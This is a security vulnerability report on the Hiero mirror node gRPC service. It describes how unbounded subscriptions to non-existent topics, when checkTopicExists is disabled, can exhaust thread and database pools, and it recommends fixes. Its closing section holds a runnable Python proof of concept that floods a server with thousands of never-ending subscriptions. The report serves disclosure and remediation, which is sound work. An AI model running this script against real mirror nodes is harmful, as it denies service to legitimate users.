### Title
Unbounded Indefinite Subscription Resource Exhaustion via Non-Existent Topic IDs When `checkTopicExists=false`

### Summary
When `hiero.mirror.grpc.checkTopicExists` is set to `false`, any unauthenticated external client can subscribe to arbitrarily many non-existent topic IDs with no `limit` and no `endTime`, causing each subscription to remain open indefinitely. Because there is no global cap on concurrent subscriptions and no per-client rate limit, an attacker opening many connections (each with up to 5 concurrent streams) can exhaust the `boundedElastic` thread pool, DB connection pool, and JVM memory, denying service to all legitimate subscribers.

### Finding Description

**Code path and root cause**

`ConsensusController.subscribeTopic()` (line 43–53) accepts any `ConsensusTopicQuery` and delegates to `TopicMessageServiceImpl.subscribeTopic()`. Inside that method, `topicExists()` (lines 94–106) performs the only existence gate:

```java
// TopicMessageServiceImpl.java:94-106
private Mono<?> topicExists(TopicMessageFilter filter) {
    var topicId = filter.getTopicId();
    return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
            .switchIfEmpty(
                    grpcProperties.isCheckTopicExists()
                            ? Mono.error(new EntityNotFoundException(topicId))
                            : Mono.just(Entity.builder()   // ← synthetic entity, no error
                                    .memo("")
                                    .type(EntityType.TOPIC)
                                    .build()))
            .filter(e -> e.getType() == EntityType.TOPIC)
            .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
}
```

When `checkTopicExists=false` and the topic does not exist in the DB, the method returns a synthetic `TOPIC` entity and the subscription proceeds normally.

Back in `subscribeTopic()` (lines 59–92), the resulting flux has **no built-in termination** unless the caller supplies a `limit` or `endTime`:

```java
// TopicMessageServiceImpl.java:79-85
if (filter.getEndTime() != null) {
    flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
}
if (filter.hasLimit()) {
    flux = flux.take(filter.getLimit());
}
```

Neither field is required by the proto schema. If both are absent, `pastEndTime()` returns `Flux.never()` (line 125), and the subscription lives forever.

**Per-subscription resource consumption**

With the default `POLL` listener type, `PollingTopicListener.listen()` (lines 34–49) creates a dedicated `Schedulers.boundedElastic()` scheduler per bean and schedules a DB query every 500 ms (`RepeatSpec.times(Long.MAX_VALUE)`) for the lifetime of the subscription:

```java
// PollingTopicListener.java:31,38-43
private final Scheduler scheduler = Schedulers.boundedElastic();

return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .jitter(0.1)
                .withFixedDelay(interval)
                .withScheduler(scheduler))
```

With the default `REDIS` listener type, `SharedTopicListener.listen()` (line 25) calls `publishOn(Schedulers.boundedElastic(), ...)`, pinning a thread from the global bounded-elastic pool per active subscriber. Additionally, the safety-check flux in `TopicMessageServiceImpl` (line 70) also schedules on `Schedulers.boundedElastic()`.

**Why existing checks are insufficient**

- `maxConcurrentCallsPerConnection = 5` (default, `NettyProperties.java:14`) limits streams **per TCP connection**, not globally. An attacker opens N connections → 5N concurrent subscriptions.
- No global subscriber cap exists. `subscriberCount` (line 48) is a metric gauge only — it is never checked against a maximum.
- No authentication or authorization is required to call `subscribeTopic`.
- No rate limiting on new subscription establishment.
- The test `topicNotFoundWithCheckTopicExistsFalse` (service test lines 132–143) explicitly confirms the subscription stays open indefinitely and requires a manual `thenCancel()` to terminate.

### Impact Explanation
Each zombie subscription continuously consumes: a `boundedElastic` thread (default cap: `10 × CPU cores`), a DB connection from the HikariCP pool (queried every 500 ms with POLL), and heap memory for `TopicContext`, `TopicMessageFilter`, and reactive operator state. Once the thread pool or DB connection pool is saturated, legitimate subscribers receive errors or hang, effectively taking the mirror node's gRPC API offline. The mirror node's own alerting (`GrpcHighDBConnections` at 75% pool utilization) would fire, but there is no automatic remediation.

### Likelihood Explanation
The precondition (`checkTopicExists=false`) is a documented, operator-configurable option explicitly listed in `docs/configuration.md` (line 409). Operators may enable it to support forward-looking subscriptions to topics not yet created. No credentials, special knowledge of the network, or on-chain resources are required — only the ability to open TCP connections to port 5600 and send valid gRPC frames. The attack is trivially scriptable and repeatable.

### Recommendation
1. **Enforce a global concurrent-subscription cap**: Check `subscriberCount` against a configurable maximum before allowing a new subscription to proceed; return `RESOURCE_EXHAUSTED` if exceeded.
2. **Require `endTime` or `limit` when `checkTopicExists=false`**: Reject open-ended subscriptions to topics that do not yet exist, or enforce a maximum subscription lifetime (e.g., a configurable `maxSubscriptionDuration`).
3. **Add per-IP or per-connection rate limiting** on new subscription establishment at the gRPC interceptor layer.
4. **Enforce a maximum `endTime` horizon**: Even when a topic exists, subscriptions with no `endTime` and no `limit` should be subject to a server-side timeout.

### Proof of Concept

**Preconditions**: Server configured with `hiero.mirror.grpc.checkTopicExists=false`. No authentication required.

**Steps**:
```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2

def open_zombie_subscription(topic_num):
    channel = grpc.insecure_channel("mirror-node:5600")
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=topic_num),
        # No limit, no consensusEndTime → subscription never terminates
    )
    for _ in stub.subscribeTopic(query):  # blocks indefinitely, consuming thread + DB conn
        pass

# Open many connections, each with 5 concurrent streams
for i in range(1000, 10000):  # non-existent topic IDs
    t = threading.Thread(target=open_zombie_subscription, args=(i,))
    t.daemon = True
    t.start()

# Result: boundedElastic thread pool exhausted, DB connection pool at 100%,
# legitimate subscribers receive UNAVAILABLE or hang.
```

**Expected result**: After enough concurrent subscriptions, `hikaricp_connections_active / hikaricp_connections_max > 1.0` and `hiero.mirror.grpc.subscribers` grows without bound. New legitimate subscriptions fail with `RESOURCE_EXHAUSTED` or time out.